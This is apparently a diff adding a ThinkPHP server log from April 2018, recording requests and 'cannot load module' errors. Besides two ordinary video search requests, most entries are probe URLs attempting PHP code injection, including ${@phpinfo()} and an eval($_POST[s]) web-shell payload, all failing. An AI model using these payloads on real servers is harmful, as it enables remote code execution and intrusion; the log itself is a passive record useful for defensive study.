@@ -1,0 +1,48 @@
+[ 2018-04-19T02:30:09+08:00 ] 148.251.234.35 /index.php?m=vod-list-id-0-pg-1-order--by--class-0-year-0-letter--area-%E4%BF%84%E7%BD%97%E6%96%AF-lang-.html
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
+ERR: 无法加载模块:Vod-list-id-0-pg-1-order--by--class-0-year-0-letter--area-俄罗斯-lang-.html
+
+[ 2018-04-19T04:41:44+08:00 ] 144.76.6.230 /index.php?s=vod-search-area-%E5%8A%A0%E6%8B%BF%E5%A4%A7.html
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
+ERR: 无法加载模块:Vod-search-area-加拿大
+
+[ 2018-04-19T15:35:19+08:00 ] 47.97.84.5 /index.php/module/aciton/param1/$%7B@print(THINK_VERSION)%7D
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
+ERR: 无法加载模块:Module
+
+[ 2018-04-19T15:35:19+08:00 ] 47.97.84.5 /index.php/module/aciton/param1/$%7B@phpinfo()%7D
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
+ERR: 无法加载模块:Module
+
+[ 2018-04-19T15:35:19+08:00 ] 47.97.84.5 /index.php/module/aciton/param1/$%7B@function_all()%7D
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
+ERR: 无法加载模块:Module
+
+[ 2018-04-19T15:35:19+08:00 ] 47.97.84.5 /index.php/module/action/param1/%7B$%7Beval($_POST[s])%7D%7D
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
+ERR: 无法加载模块:Module
+
+[ 2018-04-19T15:47:32+08:00 ] 118.31.165.43 /index.php/Index/index/name/$%7B@phpinfo()%7D
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
+ERR: 无法加载模块:Index
+
+[ 2018-04-19T15:57:57+08:00 ] 47.97.78.16 /index.php/module/aciton/param1/$%7B@phpinfo()%7D
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000000s ]
+ERR: 无法加载模块:Module
+
